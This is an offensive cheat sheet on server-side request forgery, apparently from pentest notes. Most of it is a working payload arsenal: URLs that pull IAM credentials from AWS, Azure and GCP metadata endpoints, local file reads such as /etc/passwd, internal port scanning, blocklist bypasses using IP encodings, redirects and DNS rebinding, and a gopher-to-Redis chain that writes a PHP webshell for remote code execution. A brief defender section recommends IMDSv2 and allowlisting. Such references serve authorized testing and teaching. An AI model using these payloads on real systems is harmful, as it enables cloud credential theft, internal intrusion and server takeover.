# SSRF — Server-Side Request Forgery

Abuse a server feature that fetches a URL so it makes requests **on your behalf** — reach
internal-only services, hit cloud metadata endpoints for credentials, port-scan the internal
network, or read local files. The server is your proxy into places you can't reach directly.

Replace placeholders (`<...>`) with your own values: `<target>`, `<your-ip>`, `<internal-ip>`, `<role>`.

---
---

# PART 1 — OVERVIEW (at a glance)

## Where SSRF takes you (targets, best first)

| Target | URL | Payoff |
|--------|-----|--------|
| **Cloud metadata** | `http://169.254.169.254/…` | **IAM credentials** → cloud account |
| Loopback | `http://127.0.0.1/` | Internal-only admin apps |
| Internal hosts | `http://10.x` `172.16-31.x` `192.168.x` | Reach the internal network |
| Local files | `file:///etc/passwd` | Secrets, config, keys |
| Protocol smuggling | `gopher://` `dict://` | Talk to Redis/SMTP → RCE |

## The workflow

1. **Find** a param that fetches a URL/host/path; confirm with a hit on **your** listener.
2. **Map** internal reach — loopback, internal ranges, port-scan by response differences.
3. **Go for metadata** — the cloud IMDS endpoint is almost always the crown jewel.
4. **Bypass** blocklists (localhost/metadata) with IP tricks, redirects, DNS rebinding.
5. **Impact** — cloud creds, internal RCE, file/secret reads.

## Go-to payloads

```
?url=http://<your-ip>/ssrftest              # confirm it fetches (watch your listener)
?url=http://127.0.0.1/                       # loopback
?url=http://169.254.169.254/latest/meta-data/    # AWS metadata
?url=file:///etc/passwd                      # local file read
```

## Defender notes (for the report)

- Enforce **IMDSv2** (token-required) on AWS; block `169.254.169.254` egress from apps.
- **Allowlist** outbound destinations; resolve **and validate the final IP** (not just the
  hostname) to defeat rebinding/redirects. Disable unused URL schemes (`file`, `gopher`, `dict`).

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Find SSRF-prone inputs

Any parameter that takes a URL, hostname, or file path:

```
?url=  ?uri=  ?path=  ?dest=  ?redirect=  ?next=  ?feed=  ?image=  ?webhook=
```

Also: PDF/screenshot/preview generators, webhooks, "import from URL", SSO/SAML metadata,
XML parsers (XXE), file uploads that fetch a remote URL. Confirm by pointing it at a catcher:

```bash
python3 -m http.server 80        # or Burp Collaborator / interactsh
# then: ?url=http://<your-ip>/ssrftest
```

```
what you see in the listener when it works:
10.0.0.9 - - [12/Sep/2026 09:14:02] "GET /ssrftest HTTP/1.1" 200 -
```

## Step 2 — Confirm & map internal reach

```
?url=http://127.0.0.1/            # loopback — often reveals the internal app
?url=http://localhost:8080/
?url=http://<internal-ip>/        # 10.x / 172.16-31.x / 192.168.x
```

**Port-scan internally** by watching response code / time / length differences:

```
?url=http://127.0.0.1:22/    ?url=http://127.0.0.1:3306/    # open (hang/banner) vs closed (fast error)
```

## Step 3 — Cloud metadata (the high-value target)

If the app runs in a cloud VM, the metadata service holds credentials.

**AWS (IMDSv1)** — no header needed:

```
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

```
what you see: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}  ← AWS creds
```

**AWS IMDSv2** — needs a token header (only if SSRF lets you set headers / do PUT):

```
PUT http://169.254.169.254/latest/api/token   (X-aws-ec2-metadata-token-ttl-seconds: 21600)
GET .../meta-data/...   with header  X-aws-ec2-metadata-token: <token>
```

**Azure** (requires `Metadata:true` header):

```
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
.../metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**GCP** (requires `Metadata-Flavor:Google` header):

```
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## Step 4 — Read local files / other schemes

```
?url=file:///etc/passwd
?url=file:///C:/Windows/win.ini
?url=dict://127.0.0.1:11211/stats                 # dict for simple protocol talk
?url=gopher://127.0.0.1:6379/_<redis-cmds>        # gopher = craft raw TCP (Redis, SMTP)
```

## Step 5 — Filter bypasses (blocklists on localhost/metadata)

```
127.0.0.1        → 127.1  /  0.0.0.0  /  [::1]  /  0177.0.0.1 (octal)
decimal / hex IP → http://2130706433/   http://0x7f000001/
169.254.169.254  → 169.254.169.254.nip.io   http://425.510.510.510 (overflow)
DNS rebinding    → a domain you control that resolves public first, then internal
redirect trick   → ?url=http://<your-server>/r  → 302 to the internal target
@ / # abuse       → http://expected.com@169.254.169.254/   http://169.254.169.254#expected.com
```

---
---

# PART 3 — PAYLOAD ARSENAL

## Bypass reference (localhost / metadata blocked)

| Blocked | Try instead |
|---------|-------------|
| `127.0.0.1` | `127.1` · `0.0.0.0` · `[::1]` · `2130706433` · `0x7f000001` · `0177.0.0.1` |
| `localhost` | `127.0.0.1.nip.io` · your rebinding domain |
| `169.254.169.254` | `169.254.169.254.nip.io` · decimal `2852039166` · `[::ffff:169.254.169.254]` |
| Scheme check | `http` → `https`, add `@`/`#`, use a redirect endpoint you control |
| Hostname allowlist | `http://allowed.com@evil` · `http://evil#allowed.com` · DNS rebinding |

## Cloud metadata one-liners

```
# AWS: role name → creds
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
http://169.254.169.254/latest/user-data/                  # sometimes secrets/scripts
# Azure (header Metadata:true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# GCP (header Metadata-Flavor:Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## gopher → Redis (write a webshell / keys → RCE)

```
gopher://127.0.0.1:6379/_<URL-encoded Redis protocol>
# e.g. SET a payload, CONFIG SET dir /var/www/html, CONFIG SET dbfilename shell.php, SAVE
# build with a gopher generator (Gopherus): gopherus --exploit redis
```

## Turn it into impact

```
cloud creds from metadata  → aws/az CLI (see azure-enumeration / entra-id-attacks)
internal admin panels      → auth bypass / RCE on internal apps
Redis/memcached via gopher → write webshell/keys → RCE
config/secret file reads   → creds, tokens, DB strings
```

---

**Key idea:** SSRF turns the server into a *confused deputy* — it has network access and cloud
identity you don't, and you borrow both by controlling the URL it fetches. The crown jewel is
almost always the cloud metadata endpoint (`169.254.169.254`), which can hand you the VM's IAM
credentials and pivot you from a web bug straight into the cloud account.
